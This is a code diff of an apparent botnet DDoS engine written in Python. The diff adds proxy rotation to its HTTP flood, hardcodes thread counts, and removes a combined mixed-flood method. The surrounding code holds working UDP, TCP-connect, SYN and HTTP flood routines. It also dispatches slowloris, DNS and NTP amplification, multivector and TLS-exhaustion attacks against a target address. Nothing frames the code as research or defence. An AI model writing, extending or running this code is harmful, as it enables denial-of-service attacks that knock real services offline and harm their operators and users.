@@ -2,7 +2,6 @@ import asyncio, aiohttp, socket, random, time, struct, dns.resolver, json, os, s
 from engine.proxy import ProxyManager
 from utils.logger import log
 from scapy.all import IP, TCP, UDP, ICMP, send, Raw
-import numpy as np
 
 class AttackStats:
     def __init__(self):
@@ -10,7 +9,7 @@ class AttackStats:
         self.active_attacks = 0
         self.total_packets = 0
         self.lock = asyncio.Lock()
-        self.tasks = {}  # task_id -> {'target':..., 'method':..., 'start':..., 'end':...}
+        self.tasks = {}
         self._task_counter = 0
         self._task_lock = threading.Lock()
 
@@ -53,11 +52,11 @@ class AsyncAttackEngine:
     def __init__(self):
         self.proxy_manager = ProxyManager()
         self.bot_power = {}
-        self.attack_history = []
+
     def set_bots(self, bot_list):
         self.bot_power = {b['id']: b.get('bandwidth', 10) for b in bot_list}
 
-    async def udp_flood(self, target_ip, port, duration, threads=50):
+    async def udp_flood(self, target_ip, port, duration):
         payload = random._urandom(1024)
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         end_time = time.time() + duration
@@ -65,7 +64,7 @@ class AsyncAttackEngine:
             try: sock.sendto(payload, (target_ip, port))
             except: pass
 
-    async def tcp_connect_flood(self, target_ip, port, duration, threads=100):
+    async def tcp_connect_flood(self, target_ip, port, duration):
         async def worker():
             while time.time() < end_time:
                 try:
@@ -73,10 +72,10 @@ class AsyncAttackEngine:
                     writer.close()
                 except: pass
         end_time = time.time() + duration
-        tasks = [asyncio.create_task(worker()) for _ in range(threads)]
+        tasks = [asyncio.create_task(worker()) for _ in range(100)]
         await asyncio.wait(tasks)
 
-    async def syn_flood(self, target_ip, port, duration, threads=200):
+    async def syn_flood(self, target_ip, port, duration):
         packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
         end_time = time.time() + duration
         while time.time() < end_time:
@@ -107,13 +106,16 @@ class AsyncAttackEngine:
             try: s.close()
             except: pass
 
-    async def http_flood(self, target_url, duration, threads=100):
+    async def http_flood(self, target_url, duration, threads=100, use_proxy=False):
         async def worker():
+            proxy = None
+            if use_proxy:
+                proxy = self.proxy_manager.random_proxy()
             async with aiohttp.ClientSession() as session:
                 end_time = time.time() + duration
                 while time.time() < end_time:
                     try:
-                        async with session.get(target_url) as resp:
+                        async with session.get(target_url, proxy=proxy) as resp:
                             await resp.read()
                     except: pass
         tasks = [asyncio.create_task(worker()) for _ in range(threads)]
@@ -180,11 +182,9 @@ class AsyncAttackEngine:
                 'syn': lambda: self.syn_flood(target, port, duration),
                 'icmp': lambda: self.icmp_flood(target, duration),
                 'slowloris': lambda: self.slowloris(target, duration),
-                'http': lambda: self.http_flood(f"http://{target}", duration),
+                'http': lambda: self.http_flood(f"http://{target}", duration, use_proxy=kwargs.get('use_proxy', False)),
                 'dns_amp': lambda: self.dns_amplification(target, port, duration),
                 'ntp_amp': lambda: self.ntp_amplification(target, port, duration),
-                'mixed': lambda: self.mixed_flood(target, port, duration),
-                'ai': lambda: self.ai_payload_attack(f"http://{target}", duration),
                 'multivector': lambda: self.multivector_burst(target, port, duration),
                 'tls_exhaustion': lambda: self.tls_exhaustion(target, port, duration),
             }
@@ -195,10 +195,3 @@ class AsyncAttackEngine:
                 log(f"[Attack] Неизвестный метод: {method}")
         finally:
             stats.remove_task(tid)
-
-    async def mixed_flood(self, target, port, duration):
-        await asyncio.gather(
-            self.udp_flood(target, port, duration),
-            self.syn_flood(target, port, duration),
-            self.http_flood(f"http://{target}", duration)
-        )
